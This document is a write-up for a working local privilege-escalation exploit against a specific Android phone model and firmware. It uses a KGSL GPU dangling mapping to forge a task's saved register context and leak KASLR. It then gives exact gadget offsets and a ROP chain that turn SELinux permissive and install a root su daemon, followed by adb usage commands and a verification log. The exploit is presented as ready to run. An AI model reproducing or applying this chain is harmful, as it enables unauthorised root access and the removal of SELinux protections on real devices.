# SELinux permissive on SOG02 `58.2.C.3.127`

The default run clears `selinux_state.enforcing` for the rest of the boot, so
`getenforce` reports `Permissive` and every SELinux denial becomes an
audit-only event.  It happens in the same pass as the root `su` daemon, so one
invocation gives both root and permissive.

## Why the addr_limit trick does not work here

`selinux_handoff.c` and the first permissive attempt tried to turn
`addr_limit` into `KERNEL_DS` and then use `copy_to_user`/`copy_from_user` as
kernel read/write.  On this device that always fails with `EFAULT`, with
`addr_limit` verifiably `ffffffffffffffff`:

- `CONFIG_ARM64_PAN=y` and `CONFIG_ARM64_UAO=y`, but the Kryo 585 reports
  `ID_AA64MMFR2_EL1.UAO == 0`.  Panic dumps confirm `pstate: ... -UAO`.
- Without UAO the uaccess helpers are patched to `LDTR`/`STTR`, which perform
  EL0-permission accesses.  TTBR1 supervisor pages are AP=EL1-only, so any
  kernel address faults; the extable fixup turns it into `EFAULT`.
- The GPU write of `addr_limit` itself is fine (it can be read back as
  `ffffffffffffffff`), and a dirty USER_DS cache line can also clobber it,
  but neither matters: the copy instructions cannot reach kernel memory.

`setenforce 0` cannot help either: the policy has no
`allow <domain> security:security setenforce` rule at all (only `neverallow`
and `dontaudit` for `kernel`), so no SID - including `u:r:init:s0` - passes the
`avc_has_perm(current_sid(), SECINITSID_SECURITY, security, setenforce)` check
in `sel_write_enforce`.

## The primitive: forged `thread.cpu_context`

`struct task_struct` lives in the KGSL-reclaimed pages the exploit already
reads and writes through the dangling GPU mapping, and it contains the whole
`struct thread_struct` (`0xaf0`, size `0x3d0`).  When the root child blocks in
`futex_wait`, the scheduler has saved its register context there:

| field | offset |
|---|---|
| `thread.cpu_context.x19..x28` | `0xaf0 .. 0xb38` |
| `thread.cpu_context.fp` | `0xb40` |
| `thread.cpu_context.sp` | `0xb48` |
| `thread.cpu_context.pc` | `0xb50` |
| `thread.uw.fpsimd_state.vregs` (scratch) | `0xb70 .. 0xd70` |

Two facts make this directly usable:

1. Every switch-out goes through `__switch_to -> bl cpu_switch_to`, so
   `cpu_context.pc` is always `_text + 0x89fc` plus the KASLR slide.  That is
   a free, self-validating KASLR leak (`slide >= 64 GiB`, 2 MiB aligned,
   `< 192 GiB`).
2. `cpu_switch_to` loads `pc` and then `ret`s to it with `sp` taken from the
   same context, so the parent can redirect the next switch-in of the child.

The parent rewrites the context just before it wakes the child from
`futex_wait`:

```
x19 = selinux_state        x20 = 0x01000000
sp  = task + 0xb70         pc  = store gadget
```

`0x01000000` writes `{disabled=0, enforcing=0, checkreqprot=0, initialized=1}`
in one 32-bit store, leaving `policycap[]` untouched.

### Gadgets (offsets from `_text`)

```
0x427410:  str w20, [x19]
           ldp x20, x19, [sp, #0x10]      ; x20/x19 = next frame values
           ldp x29, x30, [sp], #0x20      ; x29 = saved sp, x30 = gadget 2
           ret

0x117228:  add sp, x29, #0               ; sp = saved __switch_to frame
           ldp x20, x19, [sp, #0x10]
           ldp x29, x30, [sp], #0x20     ; __schedule fp, lr = _text+0x9538854
           ret
```

The chain in `fpsimd vregs` is only four words:

```
[0] saved cpu_context.sp    -> x29 for gadget 2
[1] 0x117228 + slide        -> x30 for gadget 2
[2] 0
[3] 0
```

So the store runs, `sp` is pointed back at the saved `__switch_to` frame, and
the kernel replays `__switch_to`'s own epilogue: `finish_task_switch()` is
called with the untouched `x0` (the real previous task), the runqueue lock is
released, and the child resumes inside `futex_wait` as if nothing happened.

Passing the real `prev` matters: `finish_task(prev)` must clear
`prev->on_cpu`.  An earlier version called `finish_task_switch()` with a fake
prev, which left the real previous task with `on_cpu == 1`; the next
`try_to_wake_up()` then spins in `smp_cond_load_acquire(&p->on_cpu, !VAL)`
and the device wedges/reboots within seconds.

## Usage

Permissive is the default, so a plain run is enough:

```sh
make PROJECT=sog02-58.2.C.3.127 NDK_ROOT="$NDK"
adb push build/sog02-58.2.C.3.127/kgsl_root_su /data/local/tmp/kgsl_root_su
adb shell 'chmod 755 /data/local/tmp/kgsl_root_su'
adb shell '/data/local/tmp/kgsl_root_su'
adb shell 'getenforce'                      # Permissive
adb shell '/data/local/tmp/su -c "id"'      # uid=0(root)
```

Overrides:

| env | default | meaning |
| --- | --- | --- |
| `SEC_PERMISSIVE=0` | on | skip the hijack, install the `su` daemon only |
| `SEC_PERM_TRIGGER=0` | on | dry run: leak KASLR, print the derived addresses, leave `cpu_context` untouched |

Keep `SEC_PERM_TRIGGER=0` in mind as the safe first step if the firmware
changes: it exercises the whole path without writing kernel memory.

Verified on `QV72130554` (SOG02, `58.2.C.3.127`, `4.19.157-perf+`):

```
[*] cpu_context pc=ffffffaf5a4889fc sp=ffffff8025a1b9c0 -> text=ffffffaf5a480000 kaslr=0000002f52000000
[*] hijack target selinux_state=ffffffaf5a7ad000 word=01000000
[+] thread.cpu_context armed (sp=fffffff320860b70 pc=ffffffaf5a4a7410)
[+] SELinux is now permissive for this boot
[+] root su service ready
```

The device stayed up (uptime > 6 minutes) with `getenforce` = `Permissive`,
`/sys/fs/selinux/enforce` = `0`, the `su` daemon alive, and block devices
readable from the root shell.

## Hazards

- A wrong KASLR slide, gadget offset or chain layout is a kernel panic.  The
  dry run (`SEC_PERM_TRIGGER=0`) only reads.
- The child's `fpsimd_state.vregs[0..1]` become the chain; its FP registers
  are garbage afterwards.  Nothing in the daemon path depends on them.
- Writing `selinux_state` assumes the `4.19.157-perf+` layout: `disabled` at
  +0, `enforcing` at +1, `checkreqprot` at +2, `initialized` at +3.  That was
  read out of the shipped `vmlinux.elf` (both `sel_read_enforce` and
  `sel_write_enforce` load `[state + 1]`), not assumed.
- The KASLR leak is taken from `cpu_context.pc`; do not arm while the child
  is runnable, because a running task's `cpu_context` is stale.
